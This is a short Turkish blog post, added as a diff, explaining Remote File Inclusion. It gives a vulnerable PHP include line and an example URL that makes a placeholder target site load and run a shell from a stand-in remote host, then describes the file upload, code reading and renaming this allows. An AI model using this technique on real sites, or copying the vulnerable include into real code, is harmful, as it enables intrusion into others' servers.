@@ -1,0 +1,17 @@
+---
+layout: post
+title: RFI (Remote File İnclusion)
+date: '2016-05-18T14:22:00.003+03:00'
+author: k4y4
+tags:
+- Remote File İnclusion nedir
+- Remote File İnclusion açığı
+- rfı nedir
+- rfı açığı
+modified_time: '2016-05-18T14:22:21.251+03:00'
+thumbnail: https://3.bp.blogspot.com/-9z-mdzKNUo0/VzxOnawzTvI/AAAAAAAAB_o/uijlmkC9n8Mmb41RND4bm5IkrKoGGi5EQCLcB/s72-c/rfi-shell-uploaded.jpg
+blogger_id: tag:blogger.com,1999:blog-4815567283606325798.post-1112824398022481436
+blogger_orig_url: http://www.erdinckaya.org/2016/05/rfi-remote-file-inclusion.html
+---
+
+<div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-9z-mdzKNUo0/VzxOnawzTvI/AAAAAAAAB_o/uijlmkC9n8Mmb41RND4bm5IkrKoGGi5EQCLcB/s1600/rfi-shell-uploaded.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="215" src="https://3.bp.blogspot.com/-9z-mdzKNUo0/VzxOnawzTvI/AAAAAAAAB_o/uijlmkC9n8Mmb41RND4bm5IkrKoGGi5EQCLcB/s400/rfi-shell-uploaded.jpg" width="400" /></a></div>RFI (Remote File İnclusion) örneği verelim;<br /><br />include(“$hakkimda/yeni/haber.php”);<br /><br />Hatamız bu satırdaki "$" parametresinden doğmaktadır. Bu sayede uzaktan dosya çağırmam mümkün oluyor.<br /><br /><b>http://www.hedefsite.com/index.php?hakkimda=<span style="color: red;">http://shelladres.com/shell.txt?</span></b><br /><br />&nbsp;Yukarıdaki kodda olduğu gibi "shell.txt?" adresinde bulunan <b>shell </b>(zararlı kod) hedefsite.com üzerinde çalışmaktadır. Sanki o <b>shell </b>o sitedeymiş gibi çalışma sağlamaktadır. Bu sayede sitenin bize vermiş olduğu izinler doğrultusunda siteye istediğimiz dosyayı sokabilir (<b>upload </b>edebilir), istediğimiz dosyanın içeriğini kodlarını vb görebilir ve isimlerini değiştirebiliriz.
